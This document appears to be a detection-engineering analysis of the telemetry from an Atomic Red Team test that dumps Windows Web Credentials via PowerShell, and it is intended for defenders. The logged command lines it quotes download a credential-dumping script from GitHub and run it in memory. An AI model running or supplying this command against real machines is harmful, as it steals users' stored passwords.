# T1555-3: Credentials from Password Stores — Dump Credentials from Windows Credential Manager With PowerShell (Web Credentials)

## Technique Context

T1555 covers credential theft from password stores. This test is structurally identical to T1555-2 but targets the Web Credentials vault rather than the Windows Credentials vault. The Web Credentials vault stores browser-saved passwords that use the Windows Data Protection API (DPAPI) — primarily from legacy Internet Explorer sessions and Microsoft Edge (EdgeHTML). On modern systems, this vault is often empty or sparsely populated, as Chromium-based Edge and Chrome use their own credential stores; however, enterprise environments with Internet Explorer or older Edge deployments may still have credentials present.

The test uses the same `GetCredmanCreds.ps1` script from the TriggerMan-S/Windows-Credential-Manager GitHub repository (commit `4ad208e7...`), but invokes `Get-CredManCreds` instead of `Get-PasswordVaultCredentials`. This function targets the DPAPI-protected Web Credential entries specifically. The delivery mechanism is identical: `IEX (IWR ...)` for memory-only execution.

This ran on ACME-WS06 with Defender disabled.

## What This Dataset Contains

The dataset contains 172 total events: 42 Sysmon events, 126 PowerShell operational events, 4 Security events, and 1 Application event.

**Sysmon EID 1 (Process Create)** captures the attack execution:

```
CommandLine: "powershell.exe" & {IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force}
CurrentDirectory: C:\Windows\TEMP\
User: NT AUTHORITY\SYSTEM
IntegrityLevel: System
```

The GitHub URL and commit hash are identical to T1555-2. Only the function name differs: `Get-CredManCreds` (for Web Credentials) versus `Get-PasswordVaultCredentials` (for Windows Credentials). Both functions live in the same `GetCredmanCreds.ps1` script.

The ART test framework `whoami.exe` identity check appears as a second Sysmon EID 1.

**Security EID 4688** captures the full process command line:

```
Process Command Line: "powershell.exe" & {IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force}
```

**Sysmon EID 7 (Image Load)** accounts for 25 events. EID 10 (Process Access) captures 4 events. EID 11 (File Create) captures 4 events. EID 17 (Pipe Create) captures 3 events.

The eid_breakdown confirms 1 EID 22 (DNS Query) and 1 EID 3 (Network Connection) — the GitHub download — are recorded though outside the 20-event sample.

**PowerShell EID 4104** captures 120 script block events, with EID 4103 capturing `Set-ExecutionPolicy` and `Write-Host "DONE"` markers, and 1 EID 4100 (error-related) present.

**Application EID 15** (1 event) appears in this dataset but is not in the sampled events; it likely represents a Windows Error Reporting or application runtime event related to the test execution.

## What This Dataset Does Not Contain

**No Security EID 5379 or 5381 credential access audit events.** As with T1555-2, the `CredEnumerate`-based access to the Web Credentials vault via P/Invoke does not consistently trigger these audit events. This is a meaningful gap: the dedicated credential access audit trail is absent even though the vault was enumerated.

**The `GetCredmanCreds.ps1` function body does not appear in sampled script block logs.** The `Get-CredManCreds` implementation, which would contain DPAPI-related calls or `CredEnumerate` with web credential type filtering, would be in the non-sampled EID 4104 events.

**No credential output.** What `Get-CredManCreds` returned — empty result, populated Web Credentials, or an error — is not recorded in any event log channel.

**No file access events** for the DPAPI-encrypted credential store files under `%LOCALAPPDATA%\Microsoft\Credentials` or `%APPDATA%\Microsoft\Credentials`.

## Assessment

The T1555-3 dataset is nearly identical in structure to T1555-2 — same script, same delivery, same execution context, different function name. This makes the two datasets complementary: T1555-2 targets Windows Credentials, T1555-3 targets Web Credentials, and the event patterns are near-identical. The event counts are also very close (T1555-2: 40 Sysmon, 126 PS, 4 Security; T1555-3: 42 Sysmon, 126 PS, 4 Security), confirming consistent telemetry collection.

Compared to the defended variant (27 Sysmon, 52 PowerShell, 10 Security), the undefended run shows the test framework executing fully without interruption. The 4 additional Sysmon EID 11 events (compared to T1555-2's 2) may reflect the Web Credential vault read touching additional temporary files.

The practical security implication is that both credential vault types can be enumerated using the same tool and the same delivery pattern, and the telemetry looks essentially the same. An analyst must inspect the function name in the command line (`Get-CredManCreds` vs `Get-PasswordVaultCredentials`) to know which vault was targeted.

## Detection Opportunities Present in This Data

**Sysmon EID 1** and **Security EID 4688** capture the full command line including the GitHub URL and function name `Get-CredManCreds`. The `IEX`/`IWR` in-memory download pattern combined with a credential-access function name in the command line is a strong behavioral indicator.

**Sysmon EID 3 and EID 22** (confirmed present) capture the outbound network connection from the SYSTEM-context PowerShell process to `raw.githubusercontent.com`. The combination of a SYSTEM PowerShell process, GitHub raw content download, and a function name containing "Creds" in the immediately following script block constitutes a high-confidence detection cluster.

**PowerShell EID 4104** would capture the in-memory script body of `GetCredmanCreds.ps1` since it is loaded via `IEX` — the script block logging would record the DPAPI and `CredEnumerate` code. Script block logging is more valuable here than process creation logging because the function names (`Get-CredManCreds`, `Get-PasswordVaultCredentials`) reveal intent even without understanding the underlying code.

The function-name distinction between T1555-2 and T1555-3 (`Get-PasswordVaultCredentials` vs `Get-CredManCreds`) can be used to determine which vault was targeted when building timelines of credential access across multiple tests or real incidents.
